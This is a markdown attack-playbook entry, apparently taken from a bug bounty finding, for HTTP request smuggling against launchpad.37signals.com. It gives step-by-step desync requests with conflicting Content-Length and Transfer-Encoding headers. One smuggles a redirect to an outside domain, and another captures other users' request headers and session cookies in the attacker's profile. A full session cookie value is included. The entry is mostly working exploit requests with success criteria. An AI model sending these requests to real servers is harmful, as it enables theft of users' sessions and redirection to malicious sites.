---
tags:
  - http-request-smuggling
  - desync
  - socket-poisoning
  - cookie-theft
  - web-exploit
type: attack_chain
tools:
  - '[[tools/Turbo-Intruder]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/http-smuggling-post-desync-redirection]]'
  - '[[commands/get-signin-victim-simulation]]'
  - '[[commands/http-smuggling-post-desync-cookie-capture]]'
  - '[[commands/get-signin-victim-trigger]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Craft-and-Send-Desync-Request-for-Redirection]]'
  - '[[procedures/Simulate-Victim-Requests-to-Observe-Poisoning]]'
  - '[[procedures/Intercept-Login-for-Token-Extraction]]'
  - '[[procedures/Craft-Desync-Request-for-Cookie-Capture]]'
  - '[[procedures/Simulate-Victims-and-View-Captured-Data]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploits an HTTP request smuggling vulnerability to desynchronize frontend and
  backend servers, poison sockets, redirect users to malicious domains, and
  capture request headers and cookies without authentication.
skill_level: intermediate
impact_level: high
id: c4cbb92c-7e64-47ff-b683-8594494c8bfd
created_at: '2025-12-13T09:01:21.733Z'
updated_at: '2025-12-13T09:01:21.733Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Unauthenticated HTTP Request Smuggling on 37signals Launchpad for Socket Poisoning and Data Capture

## Overview

This attack chain exploits an unauthenticated HTTP request smuggling vulnerability on launchpad.37signals.com by crafting ambiguous requests with conflicting Content-Length and Transfer-Encoding headers. This causes desynchronization between frontend and backend servers, allowing socket poisoning. Attackers can serve harmful responses to other users, redirect them to malicious domains, inject keyloggers, and capture request headers and cookies for mass exploitation.

## Attack Flow Visualization

```mermaid
graph LR
    A[Send Desync Request] --> B[Simulate Victims] --> C[Intercept Tokens] --> D[Send Capture Desync] --> E[View Captured Data]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#e74c3c
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Turbo-Intruder]]

### Target Environment

- Web platform with Ruby on Rails and nginx
- Open port 443
- Access to https://launchpad.37signals.com

### Initial Access Requirements

- No authentication required
- Network access to the target domain

## Detailed Attack Procedures

### Step 1: Craft and Send Desync Request for Redirection
procedure: [[procedures/Craft-and-Send-Desync-Request-for-Redirection]]

**Objective**: Exploit the request smuggling vulnerability to poison the socket and smuggle a GET request that redirects to a malicious domain.

**Instructions**: Use [[tools/Turbo-Intruder]] to send the crafted desync request with [[commands/http-smuggling-post-desync-redirection]]:

```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar
```

**Expected Output**: The request is processed, desynchronizing the servers and poisoning the socket for subsequent requests.

**Success Indicators**:
- Request sent without errors
- Socket poisoned for smuggling

### Step 2: Simulate Victim Requests to Observe Poisoning
procedure: [[procedures/Simulate-Victim-Requests-to-Observe-Poisoning]]

**Objective**: Send normal visitor requests to verify the poisoned response and observe redirection.

**Instructions**: Queue multiple GET requests using [[tools/Turbo-Intruder]] with [[commands/get-signin-victim-simulation]]:

```bash
GET /signin HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,la;q=0.8
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D

```

**Expected Output**: One or more requests are redirected to hazimaslam.com due to the smuggled request.

**Success Indicators**:
- Redirection observed in responses
- Confirmation of socket poisoning

### Step 3: Intercept Login for Token Extraction
procedure: [[procedures/Intercept-Login-for-Token-Extraction]]

**Objective**: Login to the application and intercept a request to extract necessary values for advanced exploitation.

**Instructions**: Visit https://launchpad.37signals.com/identity/edit, save changes, and intercept the POST request to extract identity_id, session_token, _launchpad_session cookies, and authenticity_token.

**Expected Output**: Extracted values including cookies and tokens.

**Success Indicators**:
- Successful extraction of required parameters
- Values ready for use in subsequent steps

### Step 4: Craft Desync Request for Cookie Capture
procedure: [[procedures/Craft-Desync-Request-for-Cookie-Capture]]

**Objective**: Send a desync request to smuggle a POST that captures and stores victim request headers and cookies.

**Instructions**: Use [[tools/Turbo-Intruder]] to send the crafted request with [[commands/http-smuggling-post-desync-cookie-capture]]:

```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d=
```

**Expected Output**: The smuggled POST captures victim data for storage.

**Success Indicators**:
- Request processed successfully
- Data capture mechanism triggered

### Step 5: Simulate Victims and View Captured Data
procedure: [[procedures/Simulate-Victims-and-View-Captured-Data]]

**Objective**: Simulate victim requests and refresh the edit page to view captured headers and cookies.

**Instructions**: Send GET requests using [[tools/Turbo-Intruder]] with [[commands/get-signin-victim-trigger]]:

```bash
GET /signin HTTP/1.1
Host: launchpad.37signals.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D
Foo: bar

```

Then refresh https://launchpad.37signals.com/identity/edit to view captured data.

**Expected Output**: Captured headers and cookies displayed on the edit page.

**Success Indicators**:
- Captured data visible
- Successful exfiltration of victim information

## Attack Chain Summary

### Key Achievements

1. Socket poisoning via request smuggling
2. Redirection to malicious domains
3. Capture of victim cookies and headers
